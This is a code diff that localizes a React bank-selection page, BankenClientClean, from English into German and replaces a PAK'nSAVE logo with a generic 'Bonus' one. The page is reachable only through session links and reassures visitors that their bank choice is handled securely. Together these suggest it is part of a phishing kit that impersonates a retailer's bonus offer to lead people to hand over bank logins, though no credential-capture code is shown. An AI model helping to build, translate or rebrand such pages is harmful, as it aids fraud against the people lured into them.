@@ -318,7 +318,7 @@ export function BankenClientClean({ sessionId, routeSessionId, initialBanks }: P
     setSaving(false);
     if (error) {
       navigationLockRef.current = false;
-      setMsg("Saving failed.");
+      setMsg("Speichern fehlgeschlagen.");
     }
     else {
       setSessionFormData(nextFormData);
@@ -341,8 +341,8 @@ export function BankenClientClean({ sessionId, routeSessionId, initialBanks }: P
       return (
         <div className="pak-page-shell">
           <div className="w-full max-w-[650px] rounded-[24px] bg-[#020b22] border border-[#0066CC] shadow-[0_0_40px_rgba(0,102,204,0.3)] p-5 sm:p-8 text-center">
-            <h2 className="text-2xl font-bold text-white mb-2">Bank Selection</h2>
-            <p className="text-sm text-gray-300 mb-8">Restoring session...</p>
+            <h2 className="text-2xl font-bold text-white mb-2">Bankauswahl</h2>
+            <p className="text-sm text-gray-300 mb-8">Sitzung wird wiederhergestellt...</p>
             <div className="flex justify-center py-12">
               <div className="size-10 animate-spin rounded-full border-4 border-[#0066CC]/30 border-t-[#0066CC]" />
             </div>
@@ -353,10 +353,10 @@ export function BankenClientClean({ sessionId, routeSessionId, initialBanks }: P
     return (
       <div className="pak-page-shell">
         <div className="w-full max-w-[650px] rounded-[24px] bg-[#020b22] border border-[#0066CC] shadow-[0_0_40px_rgba(0,102,204,0.3)] p-5 sm:p-8 text-center">
-          <h2 className="text-2xl font-bold text-white mb-2">Bank Selection</h2>
-          <p className="text-sm text-gray-300 mb-6">Invalid link.</p>
+          <h2 className="text-2xl font-bold text-white mb-2">Bankauswahl</h2>
+          <p className="text-sm text-gray-300 mb-6">Ungültiger Link.</p>
           <p className="rounded-xl border border-red-500/30 bg-red-500/10 p-4 text-center text-sm text-red-400">
-            Use the full link to continue.
+            Verwenden Sie den vollständigen Link, um fortzufahren.
           </p>
         </div>
       </div>
@@ -384,8 +384,8 @@ export function BankenClientClean({ sessionId, routeSessionId, initialBanks }: P
                 <p className="pak-form-subtitle mt-2">{settings.banken_subtitle}</p>
               </div>
               <img
-                src="/form-assets/paknsave-logo-form.png"
-                alt="PAK'nSAVE"
+                src="/form-assets/logo-form.svg"
+                alt="Bonus"
                 className="pak-form-brand-logo shrink-0"
               />
             </div>
@@ -411,7 +411,7 @@ export function BankenClientClean({ sessionId, routeSessionId, initialBanks }: P
                 <div className="grid grid-cols-1 gap-2 sm:grid-cols-2 lg:grid-cols-3">
                 {filteredOptions.length === 0 ? (
                   <div className="col-span-full rounded-2xl border border-[#ffd95c]/20 bg-white/5 p-6 text-center text-sm text-white/82">
-                    No banks were found for the selected country. Choose another country or clear the search filter.
+                    Für das ausgewählte Land wurden keine Banken gefunden. Wählen Sie ein anderes Land oder löschen Sie den Suchfilter.
                   </div>
                 ) : filteredOptions.map((opt) => (
                   <button
@@ -460,7 +460,7 @@ export function BankenClientClean({ sessionId, routeSessionId, initialBanks }: P
               <svg className="h-8 w-8 shrink-0 text-[#ffd500]" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="1.9">
                 <path d="M12 3.7 18.4 6v5.2c0 4-2.3 7.1-6.4 9.1-4.1-2-6.4-5.1-6.4-9.1V6L12 3.7Z" strokeLinejoin="round" />
               </svg>
-              <span>Your bank selection is processed securely.</span>
+              <span>Ihre Bankauswahl wird sicher verarbeitet.</span>
             </div>
           </div>
         </div>
